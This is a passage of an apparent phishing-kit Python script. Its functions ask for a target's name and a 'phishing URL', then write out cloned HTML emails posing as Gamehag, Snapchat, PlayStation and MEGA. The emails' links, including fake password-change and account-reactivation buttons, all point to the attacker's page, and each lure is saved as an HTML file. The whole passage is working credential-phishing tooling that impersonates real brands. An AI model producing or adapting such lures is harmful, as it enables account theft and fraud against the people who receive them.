				<td style="background-color:#dbe5ea;padding-left:8px;padding-right:8px" align="center">

					<table style="max-width:800px;margin:0 auto" width="100%" cellspacing="0" cellpadding="0" border="0">
						<tbody>
							<tr>
								<td style="background-color:#ffffff;padding-left:24px;padding-right:24px;padding-top:8px;padding-bottom:8px" align="center">
									<table cellspacing="0" cellpadding="0" border="0" align="center">
										<tbody>
											<tr>
												<td style="font-family:Helvetica,Arial,sans-serif;font-weight:bold;margin-top:0px;margin-bottom:0px;font-size:16px;line-height:24px;background-color:#21e7b6;border-radius:4px" width="300" align="center">
													<a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#ffffff;display:block;padding:12px 24px" href="{}">
													OPEN THE CHEST
													</a>
												</td>
											</tr>
										</tbody>
									</table>
								</td>
							</tr>
						</tbody>
					</table>

				</td>
			</tr>
		</tbody>
	</table>

	<table width="100%" cellspacing="0" cellpadding="0" border="0">
		<tbody>
			<tr>
				<td style="background-color:#dbe5ea;padding-left:8px;padding-right:8px" align="center">

					<table style="max-width:800px;margin:0 auto" width="100%" cellspacing="0" cellpadding="0" border="0">
						<tbody>
							<tr>
								<td style="background-color:#ffffff;font-size:24px;line-height:24px;height:24px">&nbsp;
								</td>
							</tr>
						</tbody>
					</table>

				</td>
			</tr>
		</tbody>
	</table>
	<table width="100%" cellspacing="0" cellpadding="0" border="0">
			<tbody>
			  <tr>
				<td style="background-color:#dbe5ea;padding-left:8px;padding-right:8px" align="center">

				  <table style="max-width:800px;margin:0 auto" width="100%" cellspacing="0" cellpadding="0" border="0">
					<tbody>
					  <tr>
						<td style="background-color:#ffffff;padding-left:24px;padding-right:24px;padding-top:16px;padding-bottom:16px" align="center">

						  <div style="max-width:584px;text-align:center">
							<table width="100%" cellspacing="0" cellpadding="0" border="0">
							  <tbody>
							  </tbody>
							</table>
						  </div>

						</td>
					  </tr>
					</tbody>
				  </table>

				</td>
			  </tr>
			</tbody>
		  </table>




	<table width="100%" cellspacing="0" cellpadding="0" border="0">
		<tbody>
			<tr>
				<td style="background-color:#dbe5ea;padding-left:8px;padding-right:8px;padding-bottom:32px" align="center">

					<table style="max-width:800px;margin:0 auto" width="100%" cellspacing="0" cellpadding="0" border="0">
						<tbody>
							<tr>
								<td style="font-family:Helvetica,Arial,sans-serif;margin-top:0px;margin-bottom:0px;background-color:#ffffff;border-radius:0px 0px 4px 4px;font-size:8px;line-height:8px;height:8px">
									&nbsp; </td>
							</tr>
							<tr>
								<td style="padding-left:16px;padding-right:16px;padding-bottom:8px" align="center">
									<div style="font-size:32px;line-height:32px;height:32px">&nbsp; </div>
									<div style="padding-bottom:8px">
										<a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#82899a" href="{}"><img style="vertical-align:middle;border:0;line-height:100%;height:auto;outline:none;text-decoration:none;max-width:48px" alt="Gamehag ico" src="https://gamehag.com/img/mails/gamehag-ico.png" width="48" height="48"></a>
									</div>
									<div style="font-family:Helvetica,Arial,sans-serif;font-weight:bold;margin-top:0px;margin-bottom:0px;text-transform:uppercase;letter-spacing:1px;font-size:12px;line-height:19px;color:#82899a;text-align:center;padding-left:8px;padding-right:8px">
										Play games and collect rewards!</div>
								</td>
							</tr>
							<tr>
								<td style="font-size:0;vertical-align:top;padding-left:16px;padding-right:16px;padding-bottom:32px" align="center">

									<div style="display:inline-block;vertical-align:top;width:100%;max-width:100px">
										<div style="font-size:32px;line-height:32px;height:32px">&nbsp; </div>
										<div style="font-family:Helvetica,Arial,sans-serif;margin-top:0px;margin-bottom:0px;font-size:14px;line-height:21px;text-align:center;padding-left:8px;padding-right:8px">
											<p style="margin-top:0px;margin-bottom:0px"><a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#82899a" href="{}"><b style="color:#82899a">Help</b></a>
											</p>
										</div>
									</div>

									<div style="display:inline-block;vertical-align:top;width:100%;max-width:400px">
										<div style="font-size:24px;line-height:24px;height:24px">&nbsp; </div>
										<div style="font-family:Helvetica,Arial,sans-serif;margin-top:0px;margin-bottom:0px;font-size:14px;line-height:21px;text-align:center;padding-left:8px;padding-right:8px">
											<p style="margin-top:0px;margin-bottom:0px">
												<a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#82899a" href="{}"><img style="vertical-align:middle;border:0;line-height:100%;height:auto;outline:none;text-decoration:none;max-width:36px" alt="fb" src="https://gamehag.com/img/mails/facebook-light.png" width="36" height="36"></a><span> &nbsp;</span>
												<a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#82899a" href="{}"><img style="vertical-align:middle;border:0;line-height:100%;height:auto;outline:none;text-decoration:none;max-width:36px" alt="tw" src="https://gamehag.com/img/mails/twitter-light.png" width="36" height="36"></a><span> &nbsp;</span>
												<a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#82899a" href="{}"><img style="vertical-align:middle;border:0;line-height:100%;height:auto;outline:none;text-decoration:none;max-width:36px" alt="ig" src="https://gamehag.com/img/mails/instagram-light.png" width="36" height="36"></a><span> &nbsp;</span>
												<a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#82899a" href="{}"><img style="vertical-align:middle;border:0;line-height:100%;height:auto;outline:none;text-decoration:none;max-width:36px" alt="sc" src="https://gamehag.com/img/mails/steam-light.png" width="36" height="36"></a>
												<a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#82899a" href="{}"><img style="vertical-align:middle;border:0;line-height:100%;height:auto;outline:none;text-decoration:none;max-width:36px" alt="sc" src="https://gamehag.com/img/mails/discord-light.png" width="36" height="36"></a>
											</p>
										</div>
									</div>

									<div style="display:inline-block;vertical-align:top;width:100%;max-width:100px">
										<div style="font-size:32px;line-height:32px;height:32px">&nbsp; </div>
										<div style="font-family:Helvetica,Arial,sans-serif;margin-top:0px;margin-bottom:0px;font-size:14px;line-height:21px;text-align:center;padding-left:8px;padding-right:8px">
											<p style="margin-top:0px;margin-bottom:0px"><a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#82899a" href="{}"><b style="color:#82899a">Dashboard</b></a></p>
										</div>
									</div>

								</td>
							</tr>
							<tr>
								<td style="font-family:Helvetica,Arial,sans-serif;margin-top:0px;margin-bottom:0px;font-size:14px;line-height:21px;color:#82899a;padding-left:24px;padding-right:24px;padding-bottom:32px" align="center">
									<p style="margin-top:0px;margin-bottom:16px">
										<a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#82899a" href="{}"><img style="vertical-align:middle;border:0;line-height:100%;height:auto;outline:none;text-decoration:none;max-width:135px" alt="AppStore" src="https://gamehag.com/img/mails/badge_appstore-light.png" width="135" height="56"></a>
										<a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#82899a" href="{}"><img style="vertical-align:middle;border:0;line-height:100%;height:auto;outline:none;text-decoration:none;max-width:135px" alt="Google Play" src="https://gamehag.com/img/mails/badge_googleplay-light.png" width="135" height="56"></a>
									</p>
									<p style="margin-top:0px;margin-bottom:8px">
										©2021 Gamehag, All rights reserved
									</p>
									<p style="margin-top:0px;margin-bottom:0px">
									<a target="_blank" style="word-break:break-word;outline:none;text-decoration:underline;font-size:12px;line-height:19px;color:#82899a" href="{}">Unsubscribe</a>
									</p>
									<img src="https://mg.gamehag.com/m/16794088.gif">
								</td>
							</tr>
						</tbody>
					</table>

					<div style="font-size:64px;line-height:64px;height:64px">&nbsp; </div>
				</td>
			</tr>
		</tbody>
	</table>
	</div>



	</div></div>""".format(Url, Url, Url, Url, Url, Url, Url, Url, Url, Url, Url, Url, Url, Url, Url, Url, Url, Url, Url, Url, Url, Url, Url, Url, Url))

	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(source)
	Html_file.close()
	print(alert + " HTML File Created")

def SnapchatSimple():
	username = input(start + " Enter Target Username: ")
	Url = input(start + " Enter Your PhishingUrl: ")

	source = ("""
	<div style="background-color:#f6f6f6;color:#000000">
	<center>
		<table style="max-width:620px;border-collapse:collapse;margin:0 auto 0 auto" width="620" cellspacing="0" cellpadding="0" border="0">
			<tbody>
			<tr>
				<td>
					<table style="max-width:580px;padding-left:20px;padding-right:20px" width="580" cellspacing="0" cellpadding="0" border="0">
						<tbody>
						<tr>
							<td style="line-height:0;padding-top:50px" align="left">
								<img src="https://storage.googleapis.com/scan-snapchat.appspot.com/creative-camera/confirm-header.png" style="background:#f6f6f6">
							</td>
						</tr>
						<tr style="background:#ffffff">
							<td style="font-family:AvenirNext-Regular,Droid Sans monospace,Roboto,Arial,sans-serif" align="center">
								<p style="font-size:45px;color:#000000;letter-spacing:-1.5px">
									Confirm your Email?</p>
							</td>
						</tr>
						<tr style="background:#ffffff">
							<td style="padding-left:20px;padding-right:20px;padding-top:29.8px;font-size:22px;color:#000000;letter-spacing:0;line-height:37px;font-family:AvenirNext-Regular,Droid Sans monospace,Roboto,Arial,sans-serif" border="0" align="left">
								<p>
									<span style="display:block">Hi <span style="font-family:AvenirNext-DemiBold,'Droid Sans monospace',Roboto,Arial,sans-serif">{}</span>,</span>
									<span style="display:block">Thank you for adding your email address to Snapchat. Confirm your email below so you can reset your account if you forget your password.</span>
								</p>
							</td>
						</tr>
						<tr style="background:#ffffff">
							<td style="padding-top:10px" align="center">
								<a target="_blank" href="{}">
									Confirm Your Email address
								</a>
							</td>
						</tr>
						<tr style="background:#ffffff">
							<td style="padding-left:20px;padding-right:20px;padding-top:29.8px;font-size:22px;color:#000000;letter-spacing:0;line-height:37px;font-family:AvenirNext-Regular,Droid Sans monospace,Roboto,Arial,sans-serif" border="0" align="left">
								<p style="margin-bottom:0px">If this is not your Snapchat account, or if you did not sign up for Snapchat, please <a target="_blank" href="{}">Click Here</a> to remove your email address from this account.</p>
							</td>
						</tr>
						<tr style="background:#ffffff">
							<td style="font-family:AvenirNext-Regular,Droid Sans monospace,Roboto,Arial,sans-serif" align="center">
								<p style="font-size:45px;color:#000000;letter-spacing:-1.5px;padding-top:30px">
									Happy Snapping!</p>
							</td>
						</tr>
						<tr>
							<td align="left">
								<img src="https://storage.googleapis.com/scan-snapchat.appspot.com/creative-camera/confirm-footer.png" style="background:#f6f6f6">
							</td>
						</tr>
						<tr>
							<td style="margin-top:0;margin-bottom:0;color:#262626;font-size:17px;padding-top:30px;padding-bottom:70px;letter-spacing:0;line-height:35px;font-family:AvenirNext-Regular,Droid Sans monospace,Roboto,Arial,sans-serif" align="center">
								<p>
									<span style="display:block">© Snap Inc.  &nbsp;&nbsp;|&nbsp;&nbsp; <a target="_blank" style="text-decoration:none;color:#0eadff" href="{}">Terms</a></span>
									<span style="display:block"><a target="_blank" style="text-decoration:none;color:#000000" href="{}">https://support.snapchat.com</a></span>
									<span style="display:block">Snap Inc., 63 Market Street, Venice CA 90291</span>
								</p>
							</td>
						</tr>
						</tbody>
					</table>
				</td>
			</tr>
			</tbody>
		</table>
	</center>
	</div>
	</div></div>""".format(username, Url, Url, Url, Url))

	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(source)
	Html_file.close()
	print(alert + " HTML File Created")
	
def Playstation():
	TargetName = input(start + " Enter Target Name Or PSN GamerTag: ")
	URL = input(start + " Enter Your Phishing Url: ")
	
	source = ("""
 <div style="background-color:#ffffff;margin:0;padding:0;width:100%!important;font-family:Arial,Helvetica,sans-serif" bgcolor="#FFFFFF">






  <table width="100%" cellspacing="0" cellpadding="0" border="0">
   <tbody>
    <tr>
     <td bgcolor="#ffffff">
      <div align="center">

       <table style="min-width:600px" width="600" cellspacing="0" cellpadding="0" border="0">
        <tbody>

         <tr>
          <td>
           <table width="100%" cellspacing="0" cellpadding="0" border="0">
            <tbody>
             <tr>
              <td style="padding:40px 20px 0px 20px" valign="top" align="center"><img style="display:block" alt="PlayStation" src="http://image.txn-email.playstation.com/lib/fe9012747462077576/m/1/cb953c58-6a5f-48f1-9f45-47d8aa707c24.jpg" width="438" height="106" border="0"></td>
             </tr>
            </tbody>
           </table></td>
         </tr>


         <tr>
          <td valign="top" align="left">

 <div>

  <table width="100%" cellspacing="0" cellpadding="0" border="0">
   <tbody>
    <tr>
     <td style="font-family:Helvetica,sans-serif;font-size:30px;color:#505050;padding:40px 20px 0px 20px" valign="top" align="center"> Requested Password Change </td>
    </tr>
    <tr>
     <td style="font-family:Helvetica,sans-serif;font-size:13px;line-height:150%;color:#505050;padding:40px 20px 20px 20px" valign="top" align="left"> Hello {}! </td>
    </tr>
    <tr>
     <td style="font-family:Helvetica,sans-serif;font-size:13px;line-height:150%;color:#505050;padding:0px 20px 20px 20px" valign="top" align="left"> Thank you for notifying us that you need to change your password </td>
    </tr>
    <tr>
     <td style="font-family:Helvetica,sans-serif;font-size:13px;line-height:150%;color:#505050;padding:0px 20px 20px 20px" valign="top" align="left"> Update by clicking the buttom below </td>
    </tr>
    <tr>
     <td style="font-family:Helvetica,sans-serif;font-size:13px;line-height:150%;color:#505050;padding:0px 20px 20px 20px" valign="top" align="center"> <table cellspacing="0" cellpadding="0"> <tbody><tr> <td style="border-radius:5px;display:block" width="250" valign="middle" height="40" bgcolor="#5887f5" align="center"><a target="_blank" style="color:#ffffff;font-size:16px;font-family:Helvetica,sans-serif;font-size:18px;text-decoration:none;line-height:40px;width:100%;display:inline-block" href="{}">Change Password</a></td> </tr> </tbody></table> </td>
    </tr>
    <tr>
     <td style="font-family:Helvetica,sans-serif;font-size:13px;line-height:150%;color:#505050;padding:0px 20px 20px 20px" valign="top" align="left"> You now have 24 hours to change the password for your account. Choose a strong password so that your account can be protected. </td>
    </tr>
    <tr>
     <td style="font-family:Helvetica,sans-serif;font-size:13px;line-height:150%;color:#505050;padding:0px 20px 20px 20px" valign="top" align="left"> Did you not request a password change? Make sure that only you can access your account and linked Sony accounts. </td>
    </tr>
    <tr>
     <td style="font-family:Helvetica,sans-serif;font-size:13px;line-height:150%;color:#505050;padding:0px 20px 20px 20px" valign="top" align="left"> Have you received this message more than once? Update the email address associated with your account <a target="_blank" href="{}">Here</a>. </td>
    </tr>
    <tr>
     <td style="font-family:Helvetica,sans-serif;font-size:13px;line-height:150%;color:#505050;padding:0px 20px 20px 20px" valign="top" align="left"> Protect your account - read our tips and guides: </td>
    </tr>
    <tr>
     <td style="font-family:Helvetica,sans-serif;font-size:13px;line-height:150%;color:#505050;padding:0px 20px 20px 20px" valign="top" align="left"> <ul><li><a target="_blank" href="{}">How to keep your account safe and secure</a></li>  <li><a target="_blank" href="{}">Enable 2-step verification in your account</a></li>  <li><a target="_blank" href="{}">Add a security question and mobile number to your account</a></li></ul> </td>
    </tr>
    <tr>
     <td style="font-family:Helvetica,sans-serif;font-size:13px;line-height:150%;color:#505050;padding:0px 20px 20px 20px" valign="top" align="center"> <table cellspacing="0" cellpadding="0"> <tbody><tr> <td style="border-radius:5px;display:block" width="250" valign="middle" height="40" bgcolor="#5887f5" align="center"><a target="_blank" style="color:#ffffff;font-size:16px;font-family:Helvetica,sans-serif;font-size:18px;text-decoration:none;line-height:40px;width:100%;display:inline-block" href="{}">Protect my account </a></td> </tr> </tbody></table> </td>
    </tr>
    <tr>
     <td style="font-family:Helvetica,sans-serif;font-size:13px;line-height:150%;color:#505050;padding:0px 20px 20px 20px" valign="top" align="left"> Best Regards </td>
    </tr>
    <tr>
     <td style="font-family:Helvetica,sans-serif;font-size:13px;line-height:150%;color:#505050;padding:0px 20px 20px 20px" valign="top" align="left"> The PlayStation-team </td>
    </tr>
    <tr>
     <td valign="top" align="left">
      <table width="100%" cellspacing="0" cellpadding="0" border="0">
       <tbody>
        <tr>
         <td style="border:none;border-bottom:1px solid #d2d2d2;font-size:1px;line-height:1px" height="1" bgcolor="#ffffff">&nbsp;</td>
        </tr>
       </tbody>
      </table> </td>
    </tr>
   </tbody>
  </table>
 </div>
 </td>
         </tr>


         <tr>
          <td valign="top" align="left">

 <div>
  <table width="100%" cellspacing="0" cellpadding="0" border="0">
   <tbody>
    <tr>
     <td style="font-family:Helvetica,sans-serif;font-size:13px;line-height:150%;color:#505050;padding:20px 20px 40px 20px" valign="top" align="left"> <a target="_blank" style="font-family:Helvetica,sans-serif;font-size:13px;line-height:150%;color:#006db4" href="{}">https://id.sonyentertainmentnetwork.com/id/management/#/p/communication?entry=security</a><br><br> If you want more information about our terms and conditions or read frequently asked questions and answers, you can visit the following places: <br> <br> Terms of service and User agreement:<br>
<a target="_blank" style="font-family:Helvetica,sans-serif;font-size:13px;line-height:150%;color:#006db4" href="{}">https://www.playstation.com/legal/PSNTerms/</a> <br><br> frequently asked questions and answers:<br> <a target="_blank" style="font-family:Helvetica,sans-serif;font-size:13px;line-height:150%;color:#006db4" href="{}">https://www.playstation.com/get-help/contact-us/</a><br> <br> Sekretesspolicy:<br>
<a target="_blank" style="font-family:Helvetica,sans-serif;font-size:13px;line-height:150%;color:#006db4" href="{}">https://www.playstation.com/legal/PSNTerms/</a>
<br> This email was sent on behalf of Sony Interactive Entertainment Network Europe Limited, a United Kingdom registered company number 06020283, located at 10 Great Marlborough Street, London, W1F 7LP. It is not possible to send a reply to the sender address for this email. If you have any questions, please contact customer service according to contact information at<a target="_blank" style="font-family:Helvetica,sans-serif;font-size:13px;line-height:150%;color:#006db4" href="{}">http://eu.playstation.com/support</a>. <br> <br>
<img style="display:inline-block" alt="Playstation" src="http://image.txn-email.playstation.com/lib/fe9012747462077576/m/1/2bae4234-eed9-42ea-a528-e5563819390a.png" width="20" height="15"> and "PlayStation" are registered trademarks of Sony Interactive Entertainment Inc. © 2021 Sony Interactive Entertainment LLC. <br> <br> </td>
    </tr>
   </tbody>
  </table>
 </div>
</td>
         </tr>

        </tbody>
       </table>

      </div></td>
    </tr>
   </tbody>
  </table>
  <img src="http://click.txn-email.playstation.com/open.aspx?ffcb10-fec2177376610274-fe271173726c027c741174-fe9012747462077576-ff951579-fe1e1172726d007f761c79-febc1c75706d0079&amp;d=60121" width="1" height="1"><u></u>
 </div>

</div></div>""".format(TargetName, URL, URL, URL, URL, URL, URL, URL, URL, URL, URL, URL))

	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(source)
	Html_file.close()
	print(alert + " HTML File Created")

def Mega():
	TargetName = input(start + " Enter Target Name: ")
	URL = input(start + " Enter Your Phishing Url: ")
	
	source = ("""
	<div style="margin:0;padding:0">
<table style="padding:0;margin:0" width="100%" cellspacing="0" cellpadding="0">
  <tbody><tr>
    <td style="font-size:0"><span></span></td>
    <td style="width:640px;max-width:640px" valign="top" align="left">
        <table style="padding:0;margin:0;border:0" width="100%" cellspacing="0" cellpadding="0" bgcolor="#ffffff">
            <tbody><tr>
              <td style="padding:32px 63px 0 63px" align="left">

                  <a target="_blank" href="https://mega.nz/"> <img src="cid:171e142a52bc204bfcc1" alt width="136"></a>


                  <h1 style="font-family:Helvetica,Arial,sans-serif;font-size:24px;line-height:31px;color:#777777;padding:0;margin:28px 0 32px 0;font-weight:400;text-align:left;text-decoration:none"><a target="_blank" href="{}" style="text-decoration:none;color:#777777"><span style="display:block"> {} </span></a></h1>

                  <p style="font-family:Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;color:#333333;margin:0;padding:0;margin:0 0 20px 0;text-align:left">
                    We notice that you haven’t used your MEGA account for quite some time. We would love to see you back!
                  </p>                 

                  <p style="font-family:Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;color:#333333;margin:0;padding:0;margin:0 0 20px 0;text-align:left">
                    MEGA is happy to offer generous free storage space to users that actively use MEGA. However, we reserve the right to delete your data if your account remains inactive for an extended amount of time.
                  </p>

                  <p style="font-family:Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;color:#333333;margin:0;padding:0;margin:0 0 20px 0;text-align:left">
                    If you want to guarantee the preservation of data in an inactive MEGA account, you can <a target="_blank" href="{}" style="font-size:16px;line-height:20px;color:#d90007;text-decoration:none">upgrade to PRO</a>.
                  </p>

                  <p style="font-family:Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;color:#333333;margin:0;padding:0;margin:0 0 20px 0;text-align:left">
                    Or you can login <a target="_blank" href="{}" style="font-size:16px;line-height:20px;color:#d90007;text-decoration:none">reactivate account here</a>.
                  </p>

                  <p style="font-family:Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;color:#333333;margin:0;padding:0;margin:0 0 20px 0;text-align:left">
                    Please note that all your data on MEGA is encrypted with your password, which only you control. If you want to retain access to the data in your MEGA account, you either need your password, an active session or your Recovery Key.
                  </p>

                  <p style="font-family:Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;color:#333333;padding:0;margin:0 0 20px 0;text-align:left">
                    If you need any assistance or have any suggestions, feel free to contact us at <a target="_blank" href="{}" style="font-size:16px;line-height:20px;color:#d90007;text-decoration:none">support@mega.nz</a>
                  </p>



                  <p style="font-family:Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;color:#333333;padding:0;margin:35px 0 0 0;text-align:left">
                    Best regards,<br>— Team MEGA
                  </p>


              </td>
            </tr>
        </tbody></table>
    </td>
    <td style="font-size:0"><span></span></td>
  </tr>


  <tr>
    <td style="font-size:0"><span></span></td>
    <td style="width:640px;max-width:640px;padding:25px 0 28px 0" valign="middle" align="center">
        <p style="font-family:Helvetica,Arial,sans-serif;font-size:14px;line-height:20px;color:#999999;padding:0;margin:4px 0 22px 0">Mega Limited {} </p>
        <table style="padding:0;margin:0;border:0" cellspacing="0" cellpadding="0">
            <tbody><tr>
                <td style="padding:0 8px"><a target="_blank" href="{}" style="text-decoration:none"><img src="cid:171e142a52cc204bfcc4" alt width="24"></a></td>
                <td style="padding:0 8px"><a target="_blank" href="{}" style="text-decoration:none"><img src="cid:171e142a52cc204bfcc2" alt width="24"></a></td>
                <td style="padding:0 8px"><a target="_blank" href="{}" style="text-decoration:none"><img src="cid:171e142a52cc204bfcc3" alt width="24"></a></td>
            </tr>
        </tbody></table>
    </td>
    <td style="font-size:0"><span></span></td>
  </tr>


</tbody></table>


</div>


</div></div>""".format(URL, TargetName, URL, URL, URL, TargetName, URL, URL, URL))
	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(source)
	Html_file.close()
	print(alert + " HTML File Created")



